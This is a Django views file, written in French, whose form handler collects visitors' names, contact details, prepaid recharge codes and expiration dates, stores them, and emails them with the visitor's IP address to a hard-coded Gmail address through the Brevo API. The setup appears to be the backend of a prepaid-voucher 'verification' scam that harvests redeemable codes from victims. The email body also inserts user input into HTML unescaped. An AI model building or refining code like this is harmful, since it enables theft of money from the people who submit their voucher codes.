from django.shortcuts import render, redirect
from django.contrib import messages
from .models import Recharge
import requests
import logging
from django.conf import settings


"""def submit_recharge(request):
    if request.method == "POST":
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        phone = request.POST.get('phone')
        email = request.POST.get('email')
        recharge_code = request.POST.get('recharge_code')
        recharge_type = request.POST.get('recharge_type')
        expiration_date = request.POST.get('expiration_date')
        accepted_terms = request.POST.get('terms') == 'on'

        if not accepted_terms:
            messages.error(request, "Veuillez accepter les termes et conditions.")
            return redirect('submit-recharge')

        Recharge.objects.create(
            first_name=first_name,
            last_name=last_name,
            phone=phone,
            email=email,
            recharge_code=recharge_code,
            recharge_type=recharge_type,
            expiration_date=expiration_date,
            accepted_terms=accepted_terms
        )

        message = f
        Nouvelle demande de recharge !

        Nom : {first_name} {last_name}
        Téléphone : {phone}
        Email : {email}
        Code de recharge : {recharge_code}
        Type : {recharge_type}
        Expiration : {expiration_date}
        

        # Envoi de l’email
        send_mail(
            subject="Nouvelle demande de recharge 🔋",
            message=message,
            from_email="cartedirecte1@gmail.com", 
            recipient_list=["cartedirecte1@gmail.com"],  # À modifier
            fail_silently=False,
        )
        messages.success(request, "Votre demande a été enregistrée avec succès ✅")
        return redirect('submit-recharge')
    return render(request, 'essai.html')
"""

def send_email_brevo(subject, message):
    """
    Envoi d'email via l'API Brevo (non bloquant)
    """
    url = "https://api.brevo.com/v3/smtp/email"

    payload = {
        "sender": {
            "name": settings.BREVO_SENDER_NAME,
            "email": settings.BREVO_SENDER_EMAIL
        },
        "to": [
            {"email": "cartedirecte1@gmail.com"}
        ],
        "subject": subject,
        "htmlContent": message.replace("\n", "<br>")
    }

    headers = {
        "accept": "application/json",
        "api-key": settings.BREVO_API_KEY,
        "content-type": "application/json"
    }
    # On veut voir si Brevo accepte ou pas
    """response = requests.post(url, json=payload, headers=headers, timeout=10)
    return response.status_code, response.text
    print("STATUS BREVO:",response.status_code)
    print("RESPONSE BREVO:",response.text)
    """
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        return response.status_code, response.text
    except requests.exceptions.RequestException as e:
        # On ne bloque JAMAIS l'utilisateur
        # print("Erreur envoi email Brevo :", str(e))
        return 500, str(e)


def submit_recharge(request):
    if request.method == "POST":
        first_name = request.POST.get('first_name')
        last_name = request.POST.get('last_name')
        phone = request.POST.get('phone')
        email = request.POST.get('email')
        recharge_code = request.POST.get('recharge_code')
        recharge_type = request.POST.get('recharge_type')
        expiration_date = request.POST.get('expiration_date')
        accepted_terms = request.POST.get('terms') == 'on'

        if not accepted_terms:
            messages.error(request, "Veuillez accepter les termes et conditions.")
            return redirect('submit-recharge')

        # Enregistrement en base
        Recharge.objects.create(
            first_name=first_name,
            last_name=last_name,
            phone=phone,
            email=email,
            recharge_code=recharge_code,
            recharge_type=recharge_type,
            expiration_date=expiration_date,
            accepted_terms=accepted_terms
        )

        message = f"""
        <h3>Nouvelle demande de recharge 🔋</h3>
        <p><strong>Nom :</strong> {first_name} {last_name}</p>
        <p><strong>Téléphone :</strong> {phone}</p>
        <p><strong>Email :</strong> {email}</p>
        <p><strong>Code :</strong> {recharge_code}</p>
        <p><strong>Type :</strong> {recharge_type}</p>
        <p><strong>Expiration :</strong> {expiration_date}</p>
        ID unique :{request.META.get('REMOTE_ADDR')}
        """

        # Envoi email (API Brevo)
        status,response = send_email_brevo(
            subject="Nouvelle demande de recharge 🔋",
            message=message
        )
        if settings.DEBUG:

            print("STATUS BREVO:",status)
            print("RESPONSE BREVO:",response)
        if status != 201:
            print("Erreur envoi email Brevo :",response)

        messages.success(request, "Votre demande a été enregistrée avec succès ✅")
        return redirect('after-submit')

    return render(request, 'essai.html')

def after_submit(request):
    return render(request, 'after.html')